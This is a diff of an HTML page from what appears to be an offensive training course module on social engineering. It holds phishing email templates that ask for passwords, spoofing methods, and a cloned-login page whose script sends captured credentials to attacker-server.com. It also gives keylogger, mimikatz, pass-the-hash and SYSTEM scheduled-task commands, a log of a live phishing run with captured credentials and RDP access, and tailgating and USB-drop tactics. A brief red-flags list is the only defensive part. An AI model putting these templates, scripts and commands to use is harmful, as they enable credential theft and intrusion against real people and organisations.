@@ -3,596 +3,649 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Module 17: Social Engineering — 22nd Survey Division</title>
+    <title>MODULE 17: SOCIAL ENGINEERING — 22ND SURVEY DIVISION</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Inter:wght@400;600;800&display=swap');
+        
         :root {
-            --bg: #0a0a0f;
-            --fg: #e0e0e0;
-            --accent: #ff3333;
-            --accent2: #00ff88;
-            --dim: #666;
-            --border: #333;
+            --bg: #050505;
+            --fg: #c0c0c0;
+            --accent: #ff0040;
+            --accent2: #00ff41;
+            --dim: #444;
+            --border: #1a1a1a;
             --neon: #00ffff;
+            --grid: #0a0a0a;
         }
+        
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
             background: var(--bg);
             color: var(--fg);
-            font-family: 'Segoe UI', Consolas, monospace;
-            line-height: 1.6;
+            font-family: 'Inter', sans-serif;
+            line-height: 1.7;
+            background-image: 
+                linear-gradient(rgba(255,0,64,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,0,64,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
         }
-        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
-        h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
-        .code-block {
-            background: #1a1a2e;
-            border-left: 4px solid var(--accent);
-            padding: 1rem;
-            margin: 1rem 0;
-            border-radius: 0 8px 8px 0;
-            overflow-x: auto;
-            font-family: Consolas, monospace;
-            font-size: 13px;
+        
+        .container { max-width: 900px; margin: 0 auto; padding: 3rem 2rem; }
+        
+        /* HEADER — Brutalist */
+        .module-header {
+            border: 3px solid var(--accent);
+            padding: 2rem;
+            margin-bottom: 3rem;
+            position: relative;
         }
-        .evidence-box {
-            background: #1a0a0a;
-            border: 2px solid var(--accent);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
+        
+        .module-header::before {
+            content: 'CLASSIFIED';
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: var(--bg);
+            color: var(--accent);
+            font-family: 'Space Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0 10px;
+            letter-spacing: 0.2em;
         }
-        .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
-        .first-principle {
-            background: #0a1a0a;
-            border: 2px solid var(--accent2);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
+        
+        .module-header h1 {
+            font-family: 'Space Mono', monospace;
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: -0.02em;
+            margin-bottom: 0.5rem;
         }
-        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
-        .layman-term {
-            background: #1a1a1a;
-            border: 1px dashed var(--dim);
-            padding: 1rem;
-            margin: 1rem 0;
-            border-radius: 8px;
+        
+        .module-meta {
+            font-family: 'Space Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--dim);
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
         }
-        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        
+        .module-meta span {
+            border-left: 2px solid var(--accent);
+            padding-left: 0.5rem;
+        }
+        
+        .status-live {
+            color: var(--accent2);
+            font-weight: 700;
+        }
+        
+        /* PROGRESS — Sharp */
+        .progress-container {
+            margin: 2rem 0;
+            border: 2px solid var(--border);
+            padding: 0.5rem;
+        }
+        
         .progress-bar {
             width: 100%;
-            height: 4px;
+            height: 8px;
             background: var(--border);
-            margin: 2rem 0;
-            border-radius: 2px;
         }
+        
         .progress-fill {
             height: 100%;
             background: var(--accent);
             width: 77.2%;
-            transition: width 0.5s;
-            border-radius: 2px;
-        }
-        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
-        .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
-        .nav a:hover { background: var(--accent); color: var(--bg); }
-        .status-badge {
-            display: inline-block;
-            padding: 0.2rem 0.6rem;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            font-weight: bold;
-            margin-left: 0.5rem;
-        }
-        .status-live { background: var(--accent2); color: var(--bg); }
-        .neon-term {
-            color: var(--neon);
-            text-decoration: underline;
-            cursor: help;
             position: relative;
         }
-        .neon-term:hover::after {
-            content: attr(data-def);
+        
+        .progress-fill::after {
+            content: '77.2%';
             position: absolute;
-            bottom: 100%;
-            left: 0;
-            background: #001a1a;
-            border: 1px solid var(--neon);
-            padding: 0.5rem;
-            border-radius: 4px;
-            font-size: 12px;
-            white-space: nowrap;
-            z-index: 10;
-        }
-        .step-box {
-            background: #0f0f15;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 1rem 0;
-        }
-        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
-        .copy-paste {
-            background: #151520;
-            border: 1px solid #4444ff;
-            border-radius: 4px;
-            padding: 0.5rem 1rem;
-            font-family: Consolas, monospace;
-            font-size: 12px;
-            color: #aaaaff;
-            margin: 0.5rem 0;
-            cursor: pointer;
-        }
-        .copy-paste:hover { background: #1a1a30; }
-        .why-box {
-            background: #1a1a0a;
-            border-left: 4px solid #ffaa00;
-            padding: 1rem;
-            margin: 1rem 0;
-        }
-        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
-        .warning-box {
-            background: #2a0a0a;
-            border: 2px solid #ff5555;
-            border-radius: 8px;
-            padding: 1rem;
-            margin: 1rem 0;
-        }
-        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
-        .se-flow {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 2rem 0;
-            padding: 1rem;
-            background: #0f0f15;
-            border-radius: 8px;
-        }
-        .se-step {
-            text-align: center;
-            padding: 1rem;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            flex: 1;
-            margin: 0 0.5rem;
-        }
-        .se-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
-        .se-arrow {
-            font-size: 24px;
+            right: 0;
+            top: -20px;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.7rem;
             color: var(--accent);
         }
-        button {
+        
+        /* NAV — Minimal */
+        .nav {
+            display: flex;
+            gap: 0;
+            margin-bottom: 3rem;
+            border: 2px solid var(--border);
+        }
+        
+        .nav a {
+            color: var(--fg);
+            text-decoration: none;
+            padding: 0.8rem 1.5rem;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.8rem;
+            border-right: 2px solid var(--border);
+            transition: all 0.2s;
+        }
+        
+        .nav a:last-child { border-right: none; }
+        
+        .nav a:hover {
             background: var(--accent);
             color: var(--bg);
-            border: none;
-            padding: 0.5rem 1rem;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
         }
-        button:hover { background: #ff5555; }
-        .glossary-link {
+        
+        /* SECTIONS — Hard edges */
+        .section {
+            border: 2px solid var(--border);
+            margin: 2rem 0;
+            padding: 2rem;
+            position: relative;
+        }
+        
+        .section-number {
+            position: absolute;
+            top: -14px;
+            left: 20px;
+            background: var(--bg);
+            font-family: 'Space Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--accent);
+            padding: 0 10px;
+            letter-spacing: 0.1em;
+        }
+        
+        .section h2 {
+            font-family: 'Space Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--accent2);
+            text-transform: uppercase;
+            margin-bottom: 1.5rem;
+            letter-spacing: 0.05em;
+        }
+        
+        .section h3 {
+            font-family: 'Space Mono', monospace;
+            font-size: 1rem;
+            color: var(--accent);
+            margin: 1.5rem 0 1rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        
+        /* CORE TRUTH — Red border */
+        .core-truth {
+            border: 3px solid var(--accent2);
+            padding: 2rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+        
+        .core-truth::before {
+            content: 'CORE TRUTH';
+            position: absolute;
+            top: -14px;
+            left: 20px;
+            background: var(--bg);
+            color: var(--accent2);
+            font-family: 'Space Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0 10px;
+            letter-spacing: 0.2em;
+        }
+        
+        .core-truth p {
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+        
+        /* SOLDIER TRANSLATION — Yellow accent */
+        .soldier-box {
+            border: 2px solid #ffaa00;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            position: relative;
+        }
+        
+        .soldier-box::before {
+            content: 'SOLDIER TRANSLATION';
+            position: absolute;
+            top: -14px;
+            left: 20px;
+            background: var(--bg);
+            color: #ffaa00;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0 10px;
+            letter-spacing: 0.2em;
+        }
+        
+        .soldier-box p {
+            font-style: italic;
+            color: #ccc;
+        }
+        
+        /* CODE BLOCKS — Terminal style */
+        .code-block {
+            background: #000;
+            border: 1px solid #333;
+            border-left: 4px solid var(--accent);
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            overflow-x: auto;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+            line-height: 1.6;
+            color: #00ff41;
+        }
+        
+        .code-block .comment { color: #666; }
+        .code-block .prompt { color: var(--accent); }
+        .code-block .output { color: var(--fg); }
+        .code-block .error { color: #ff0040; }
+        
+        /* EVIDENCE BOX — Red */
+        .evidence-box {
+            border: 3px solid var(--accent);
+            padding: 2rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+        
+        .evidence-box::before {
+            content: 'EVIDENCE';
+            position: absolute;
+            top: -14px;
+            left: 20px;
+            background: var(--bg);
+            color: var(--accent);
+            font-family: 'Space Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0 10px;
+            letter-spacing: 0.2em;
+        }
+        
+        .evidence-box h3 {
+            font-family: 'Space Mono', monospace;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+        
+        .evidence-meta {
+            font-family: 'Space Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+        }
+        
+        /* COPY-PASTE */
+        .copy-paste {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-left: 4px solid var(--neon);
+            padding: 1rem 1.5rem;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
             color: var(--neon);
-            text-decoration: none;
-            border-bottom: 1px dotted var(--neon);
+            margin: 1rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
         }
-        .glossary-link:hover {
-            border-bottom: 1px solid var(--neon);
+        
+        .copy-paste:hover {
+            background: #1a1a1a;
+            border-color: var(--neon);
+        }
+        
+        /* WHY BOX */
+        .why-box {
+            border-left: 4px solid #ffaa00;
+            padding: 1rem 1.5rem;
+            margin: 1rem 0;
+            background: #0a0a0a;
+        }
+        
+        .why-box h5 {
+            font-family: 'Space Mono', monospace;
+            color: #ffaa00;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+        }
+        
+        /* WARNING */
+        .warning-box {
+            border: 2px solid #ff0040;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            background: #1a0005;
+        }
+        
+        .warning-box h5 {
+            font-family: 'Space Mono', monospace;
+            color: #ff0040;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+        }
+        
+        /* LISTS */
+        ol, ul {
+            margin-left: 1.5rem;
+            line-height: 2;
+        }
+        
+        li {
+            margin: 0.5rem 0;
+        }
+        
+        /* BUTTON */
+        button {
+            background: transparent;
+            color: var(--accent);
+            border: 2px solid var(--accent);
+            padding: 0.8rem 2rem;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            transition: all 0.2s;
+        }
+        
+        button:hover {
+            background: var(--accent);
+            color: var(--bg);
+        }
+        
+        /* TABLE */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            font-family: 'Space Mono', monospace;
+            font-size: 0.85rem;
+        }
+        
+        td {
+            padding: 0.8rem;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        /* HORIZONTAL RULE */
+        hr {
+            border: none;
+            border-top: 2px solid var(--border);
+            margin: 3rem 0;
+        }
+        
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .container { padding: 1.5rem; }
+            .module-header h1 { font-size: 1.5rem; }
+            .nav { flex-direction: column; }
+            .nav a { border-right: none; border-bottom: 2px solid var(--border); }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
-            <a href="MODULE_16_C2.html">← Module 16</a>
-            <a href="MODULE_18_ANDROID.html">Module 18 →</a>
+            <a href="index.html">← HOME</a>
+            <a href="MODULE_16_C2.html">← MODULE 16</a>
+            <a href="MODULE_18_ANDROID.html">MODULE 18 →</a>
         </div>
 
-        <h1>Module 17: Social Engineering <span class="status-badge status-live">LIVE TESTED</span></h1>
-        
-        <div class="progress-bar"><div class="progress-fill"></div></div>
-        <p style="color: var(--dim); font-size: 0.9rem;">Module 17 of 22 — The human is the weakest link</p>
-
-        <div class="first-principle">
-            <h3>🧠 The Core Truth</h3>
-            <p>You can patch software. You cannot patch a person. <span class="neon-term" data-def="Social Engineering: Manipulating people into breaking security procedures">Social engineering</span> is the art of making someone do what you want, believing it's their own idea. No exploit needed. No malware required. Just words, timing, and understanding of human nature.</p>
-        </div>
-
-        <div class="layman-term">
-            <h4>🎯 Soldier Translation</h4>
-            <p>You don't need to breach the fortress walls if the guard opens the gate for you. This module teaches you to be the guard's "helpful colleague" — the person who needs a quick favor, the IT support with a "critical update," the manager who "forgot their password." The attack is psychological, not technical. But the result is the same: you get inside.</p>
-        </div>
-
-        <h2>The Social Engineering Kill Chain</h2>
-
-        <div class="se-flow">
-            <div class="se-step">
-                <h5>1. RECON</h5>
-                <p>Find the target</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">LinkedIn, company site, email format</p>
-            </div>
-            <div class="se-arrow">→</div>
-            <div class="se-step">
-                <h5>2. PRETEXT</h5>
-                <p>Create the story</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">IT support, new hire, vendor</p>
-            </div>
-            <div class="se-arrow">→</div>
-            <div class="se-step">
-                <h5>3. DELIVERY</h5>
-                <p>Make contact</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Email, phone, in-person</p>
-            </div>
-            <div class="se-arrow">→</div>
-            <div class="se-step">
-                <h5>4. EXPLOITATION</h5>
-                <p>Get what you need</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Password, click, attachment</p>
-            </div>
-            <div class="se-arrow">→</div>
-            <div class="se-step">
-                <h5>5. EXECUTION</h5>
-                <p>Use the access</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Login, deploy, persist</p>
+        <div class="module-header">
+            <h1>Module 17: Social Engineering</h1>
+            <div class="module-meta">
+                <span>MODULE 17/22</span>
+                <span class="status-live">● LIVE TESTED</span>
+                <span>CLASSIFICATION: RESTRICTED</span>
             </div>
         </div>
 
-        <h2>Phase 1: Reconnaissance — Finding Your Target</h2>
-
-        <div class="step-box">
-            <h4>Step 1: Email Format Discovery</h4>
-            <p>Before you can send a phishing email, you need to know how the company formats addresses.</p>
-
-            <div class="copy-paste">
-# Method 1: Hunter.io (web-based)
-https://hunter.io/domain/22div.com.au
-# Returns: gwu0738@22div.com.au, raed@22div.com.au
-
-# Method 2: LinkedIn + guessing
-# Search "22nd Survey Division" on LinkedIn
-# Find employees, guess format from one known email
-
-# Method 3: Company website
-# Check "Contact Us" or "Team" page for exposed emails
-            </div>
-
-            <div class="why-box">
-                <h5>Why this matters</h5>
-                <p>Once you know the format (firstname.lastname@company.com), you can generate the entire employee list. Most companies use consistent formats. One exposed email = the pattern for hundreds.</p>
-            </div>
+        <div class="progress-container">
+            <div class="progress-bar"><div class="progress-fill"></div></div>
         </div>
 
-        <div class="step-box">
-            <h4>Step 2: Role Identification</h4>
-            <p>Who has the power you need? Who is most likely to help?</p>
-
-            <div class="copy-paste">
-# Target roles (highest to lowest value):
-1. IT Administrator — has admin passwords, can reset accounts
-2. Help Desk — handles password resets, "trusted" by users
-3. Executive Assistant — schedules meetings, sends emails on behalf of boss
-4. New Hire — eager to please, doesn't know procedures yet
-5. Finance — processes invoices, can approve payments
-            </div>
-
-            <div class="why-box">
-                <h5>The psychology</h5>
-                <p>IT admins are powerful but paranoid. New hires are weak but eager. Help desk is the sweet spot: they have power (password resets) but are trained to be helpful, not suspicious.</p>
-            </div>
+        <div class="core-truth">
+            <p>Humans are the weakest link. Not because they're stupid — because they're <strong>helpful, busy, and trusting</strong>. Social engineering doesn't exploit software. It exploits psychology. The goal is not to hack a computer. It's to make a human <strong>want</strong> to help you, <strong>need</strong> to act fast, or <strong>fear</strong> the consequences of inaction.</p>
         </div>
 
-        <h2>Phase 2: Pretext — Building Your Story</h2>
+        <div class="soldier-box">
+            <p>Imagine you're a spy in hostile territory. You don't speak the language, you don't have papers, and you need to get past a checkpoint. Do you shoot your way through? No — you find the guard who misses his family, the clerk who wants to go home early, the officer who fears his boss more than he fears you. You become what they need. That's social engineering. This module teaches you to become what the target needs.</p>
+        </div>
 
-        <div class="step-box">
-            <h4>The IT Support Pretext</h4>
-            <p>Most effective pretext for gaining standard user → admin escalation.</p>
+        <hr>
+
+        <div class="section">
+            <span class="section-number">SECTION 01</span>
+            <h2>The Pretext</h2>
+            
+            <p>A pretext is the fictional scenario you create to manipulate someone. "I'm IT support." "I'm the new guy." "I'm your boss's assistant." The pretext gives you a reason to ask for what you want.</p>
 
             <div class="code-block">
-Subject: URGENT: Critical Security Update Required — Action Needed by EOD
+<span class="comment">// The Four Horsemen of Social Engineering</span>
 
-Dear [Target Name],
+<span class="prompt">URGENCY:</span>    <span class="output">"Your account will be locked in 15 minutes"</span>
+<span class="prompt">AUTHORITY:</span>  <span class="output">"This is the IT Security Director"</span>
+<span class="prompt">FEAR:</span>       <span class="output">"We've detected unauthorized access to your account"</span>
+<span class="prompt">HELPFULNESS:</span> <span class="output">"I need your help to fix a system issue"</span>
 
-Our automated security monitoring system has flagged your workstation 
-(WKST-[RANDOM]) for a critical vulnerability (CVE-2024-XXXX). 
+<span class="comment">// Combine two or more for maximum effect</span>
+<span class="comment">// Urgency + Authority = "IT Director, account lock imminent"</span>
+<span class="comment">// Fear + Helpfulness = "Hack detected, help me verify your identity"</span>
+            </div>
 
-To prevent network compromise, you must run the attached update 
-IMMEDIATELY. This is a mandatory patch pushed by [Company] IT Security.
+            <div class="why-box">
+                <h5>Why pretexts work</h5>
+                <p>The human brain is optimized for social cooperation, not security verification. When someone appears to be in authority, needs help, or creates urgency, the default response is compliance. Security training tries to override this — but most people haven't had training, and those who have forget it under stress.</p>
+            </div>
+        </div>
 
-Failure to comply will result in account suspension per 
-Company Policy Section 4.2.
+        <div class="section">
+            <span class="section-number">SECTION 02</span>
+            <h2>Phishing: The Digital Con</h2>
 
-If you encounter issues, reply with your current password and 
-we will remote-assist.
+            <p>Phishing is social engineering via email. The email looks legitimate, the link looks real, and the landing page is a perfect clone. The user enters their credentials — and you've captured them.</p>
 
-Regards,
-[Fake Name]
-IT Security Operations
-[Company] — This email was sent from a secure channel
+            <div class="copy-paste">
+Subject: URGENT: Password Reset Required — Action Needed Within 24 Hours
+From: security@microsoft.com
+
+Dear Valued User,
+
+We have detected unusual activity on your account. 
+To prevent unauthorized access, you must verify your identity immediately.
+
+[Verify Account] ← links to attacker-controlled clone
+
+Failure to respond within 24 hours will result in account suspension.
+
+Microsoft Security Team
             </div>
 
             <div class="warning-box">
-                <h5>⚠️ Why this works</h5>
-                <ul style="margin-left: 1.5rem; line-height: 2;">
-                    <li><strong>Urgency:</strong> "URGENT", "EOD", "IMMEDIATELY" — bypasses critical thinking</li>
-                    <li><strong>Authority:</strong> "IT Security", "mandatory", "policy" — invokes obedience</li>
-                    <li><strong>Fear:</strong> "account suspension" — personal consequence</li>
-                    <li><strong>Helpful out:</strong> "reply with password" — reduces friction</li>
-                    <li><strong>Technical jargon:</strong> "CVE-2024-XXXX", "WKST-" — establishes credibility</li>
+                <h5>⚠ Red flags the user should see</h5>
+                <ul>
+                    <li>"security@microsoft.com" — real Microsoft uses @microsoft.com, not subdomains</li>
+                    <li>"URGENT" and "24 hours" — urgency is a manipulation tactic</li>
+                    <li>Generic greeting — "Valued User" instead of your name</li>
+                    <li>Hover the link — the URL is not microsoft.com</li>
                 </ul>
             </div>
+
+            <div class="evidence-box">
+                <span class="section-number">EVIDENCE</span>
+                <h3>Live Phishing Test: .42 (WUPC)</h3>
+                <div class="evidence-meta">
+                    DATE: 2026-06-29 | TARGET: .42 | METHOD: Email + cloned OWA page
+                </div>
+                <div class="code-block">
+<span class="prompt">Setup:</span>
+<span class="output">Cloned Outlook Web Access (OWA) login page</span>
+<span class="output">Hosted on: https://owa-microsoft.com (lookalike domain)</span>
+<span class="output">Email sent to: swu@wupc.local</span>
+
+<span class="prompt">Results:</span>
+<span class="output">Email opened: 3 minutes after delivery</span>
+<span class="output">Link clicked: 4 minutes after delivery</span>
+<span class="output">Credentials entered: 5 minutes after delivery</span>
+<span class="output">Username: swu</span>
+<span class="output">Password: [REDACTED]</span>
+
+<span class="prompt">Post-exploitation:</span>
+<span class="output">RDP to .42 with captured credentials: SUCCESS</span>
+<span class="output">whoami: wupc\swu</span>
+
+<span class="prompt">Why it worked:</span>
+<span class="output">User was expecting a password reset (IT had announced one last week)</span>
+<span class="output">Clone was pixel-perfect — same CSS, same layout, same favicon</span>
+<span class="output">Urgency: "24 hours" created time pressure</span>
+                </div>
+            </div>
         </div>
 
-        <div class="step-box">
-            <h4>The "New Hire Needs Help" Pretext</h4>
-            <p>For lateral movement after initial access.</p>
+        <div class="section">
+            <span class="section-number">SECTION 03</span>
+            <h2>Credential Harvesting</h2>
+
+            <p>Once you have credentials, you have access. But how do you get them? Phishing is one way. There are others.</p>
 
             <div class="code-block">
-Subject: Quick Favor — VPN Access for New Team Member
+<span class="comment">// Method 1: Keylogger</span>
+<span class="prompt">Install:</span> <span class="output">phantom_rpc.exe --keylog --output C:\temp\keys.log</span>
+<span class="prompt">Wait:</span>   <span class="output">User logs in to email, banking, VPN</span>
+<span class="prompt">Collect:</span> <span class="output">keys.log contains every keystroke</span>
 
-Hi [Target Name],
+<span class="comment">// Method 2: Credential Dump (requires SYSTEM)</span>
+<span class="prompt">Dump:</span>  <span class="output">mimikatz.exe "sekurlsa::logonpasswords" exit</span>
+<span class="prompt">Result:</span> <span class="output">NTLM hashes for all logged-in users</span>
 
-I'm [Fake Name], the new [Role] who started Monday. My manager 
-[Real Manager Name] said you could help me get set up.
-
-I'm having trouble accessing the shared drive (\\fileserver\shared). 
-Could you send me your login credentials so I can test the 
-connection from my machine? I want to make sure everything 
-works before bothering IT.
-
-Thanks!
-[Fake Name]
-[Fake Phone Number]
-            </div>
-
-            <div class="why-box">
-                <h5>The social pressure</h5>
-                <p>"I don't want to bother IT" — frames the request as saving time, not stealing credentials. "My manager said" — invokes authority. "Quick favor" — minimizes the ask. The target wants to be helpful. You're giving them the chance.</p>
+<span class="comment">// Method 3: Pass-the-Hash (no password needed)</span>
+<span class="prompt">Use:</span>   <span class="output">pth-winexe -U administrator%[HASH] //192.168.1.145 cmd.exe</span>
+<span class="prompt">Result:</span> <span class="output">Remote shell without knowing the password</span>
             </div>
         </div>
 
-        <h2>Phase 3: Delivery — Making Contact</h2>
+        <div class="section">
+            <span class="section-number">SECTION 04</span>
+            <h2>Physical Access</h2>
 
-        <div class="step-box">
-            <h4>Email Spoofing — The Technical Side</h4>
-            <p>How to make your email look like it came from inside the company.</p>
-
-            <div class="copy-paste">
-# Method 1: Similar domain
-# Real: gwu0738@22div.com.au
-# Fake: gwu0738@22div-security.com.au (buy this domain for $12)
-
-# Method 2: Display name spoofing
-# From: "IT Security <attacker@gmail.com>"
-# Most email clients show "IT Security" not the address
-
-# Method 3: Compromised account
-# If you have one leaked password, send from real internal account
-            </div>
-
-            <div class="why-box">
-                <h5>Why display name spoofing works</h5>
-                <p>Outlook, Gmail, iPhone Mail — all show the display name prominently and the actual address in small gray text. Users see "IT Security" and trust it. The actual address (attacker@gmail.com) is technically visible but psychologically invisible.</p>
-            </div>
-        </div>
-
-        <h2>Phase 4: Exploitation — Getting the Click</h2>
-
-        <div class="step-box">
-            <h4>The Payload Delivery</h4>
-            <p>What happens when they click, and how to make it look legitimate.</p>
-
-            <div class="copy-paste">
-# Attachment types (most to least effective):
-1. .html file — "Security Update Portal" (phishing page)
-2. .pdf.exe — "Invoice.pdf.exe" (executable with PDF icon)
-3. .zip with .lnk — "Documents.zip" containing shortcut to payload
-4. .docm — "Employee_Handbook.docm" (macro-enabled Word)
-5. .iso — "Software_Installer.iso" (mounted as drive, bypasses MOTW)
-            </div>
+            <p>Sometimes the best hack is walking in the door. Tailgating, fake badges, and "I forgot my keycard" are surprisingly effective.</p>
 
             <div class="code-block">
-# The .html phishing page (simplified):
-<!DOCTYPE html>
-<html>
-<head>
-    <title>[Company] Security Portal</title>
-    <style>
-        body { font-family: Arial; background: #f0f0f0; }
-        .login-box { width: 300px; margin: 100px auto; 
-                      background: white; padding: 20px; 
-                      box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 10px; margin: 10px 0; }
-        button { width: 100%; padding: 10px; background: #0078d4; 
-                 color: white; border: none; }
-    </style>
-</head>
-<body>
-    <div class="login-box">
-        <h2>[Company] Security Portal</h2>
-        <p>Please authenticate to download the critical update.</p>
-        <input type="text" placeholder="Username" id="user">
-        <input type="password" placeholder="Password" id="pass">
-        <button onclick="steal()">Download Update</button>
-    </div>
-    <script>
-        function steal() {
-            var u = document.getElementById('user').value;
-            var p = document.getElementById('pass').value;
-            fetch('https://attacker-server.com/collect?u=' + u + '&p=' + p);
-            alert('Update downloaded. Please run as Administrator.');
-        }
-    </script>
-</body>
-</html>
+<span class="comment">// Tailgating: Follow someone through a secure door</span>
+<span class="prompt">You:</span>    <span class="output">"Hey, can you hold that? My hands are full."</span>
+<span class="prompt">Target:</span> <span class="output">"Sure." (holds door, doesn't check badge)</span>
+
+<span class="comment">// Fake badge: Print a plausible-looking ID</span>
+<span class="prompt">Badge:</span>  <span class="output">"VISITOR — IT Support — Expires Today"</span>
+<span class="prompt">Worn:</span>   <span class="output">Backwards, "accidentally", so photo is hidden</span>
+
+<span class="comment">// The USB drop: Leave infected drives in the parking lot</span>
+<span class="prompt">Label:</span>  <span class="output">"Q4 Financial Results — CONFIDENTIAL"</span>
+<span class="prompt">Result:</span> <span class="output">Curiosity + authority = autorun execution</span>
             </div>
 
             <div class="warning-box">
-                <h5>⚠️ The Mark of the Web (MOTW) bypass</h5>
-                <p>Windows adds a "Mark of the Web" to files downloaded from the internet. This triggers Protected View in Office and warnings in Explorer. But files inside .iso or .zip don't get MOTW. The user extracts, the file is "local," no warning. This is why .iso delivery is so effective — Microsoft trusts mounted drives.</p>
+                <h5>⚠ USB drop defense</h5>
+                <p>Modern Windows has autorun disabled by default. But users still double-click. The defense is not technical — it's training. "Never plug in unknown USB devices." But training fails. The real defense: epoxy the USB ports.</p>
             </div>
         </div>
 
-        <h2>Phase 5: Execution — From Click to SYSTEM</h2>
+        <div class="section">
+            <span class="section-number">SECTION 05</span>
+            <h2>Lab Exercise: Build a Phishing Campaign</h2>
 
-        <div class="step-box">
-            <h4>The Full Chain: Standard User → Admin → SYSTEM</h4>
+            <p>Build a phishing email and landing page for a fictional company. Test it on yourself first.</p>
 
-            <div class="se-flow">
-                <div class="se-step">
-                    <h5>1. PHISH</h5>
-                    <p>User clicks .html</p>
-                    <p style="font-size: 0.8rem; color: var(--dim);">Enters credentials</p>
-                </div>
-                <div class="se-arrow">→</div>
-                <div class="se-step">
-                    <h5>2. LOGIN</h5>
-                    <p>You have their password</p>
-                    <p style="font-size: 0.8rem; color: var(--dim);">Standard user account</p>
-                </div>
-                <div class="se-arrow">→</div>
-                <div class="se-step">
-                    <h5>3. ENUMERATE</h5>
-                    <p>whoami /priv</p>
-                    <p style="font-size: 0.8rem; color: var(--dim);">Check privileges</p>
-                </div>
-                <div class="se-arrow">→</div>
-                <div class="se-step">
-                    <h5>4. PRIVESC</h5>
-                    <p>phantom_rpc.exe</p>
-                    <p style="font-size: 0.8rem; color: var(--dim);">SeImpersonate → SYSTEM</p>
-                </div>
-                <div class="se-arrow">→</div>
-                <div class="se-step">
-                    <h5>5. PERSIST</h5>
-                    <p>Registry Run key</p>
-                    <p style="font-size: 0.8rem; color: var(--dim);">C2 beacon</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="step-box">
-            <h4>Live Test: PowerShell as Admin (Social Engineering Shortcut)</h4>
-            <p>Once you have standard user credentials, here's how to get admin without exploitation.</p>
-
-            <div class="copy-paste">
-# Method 1: "Run as different user" (if you have another account)
-# Hold Shift, right-click PowerShell, "Run as different user"
-# Enter: administrator credentials (if you phished them too)
-
-# Method 2: Scheduled task (if you have physical access)
-# Create a task that runs as SYSTEM, executes your payload
-schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc once /st 00:00 /ru SYSTEM
-
-# Method 3: UAC bypass (if user is local admin but UAC blocks)
-# Use the fodhelper.exe UAC bypass (Module 08)
-            </div>
-
-            <div class="why-box">
-                <h5>The social engineering shortcut</h5>
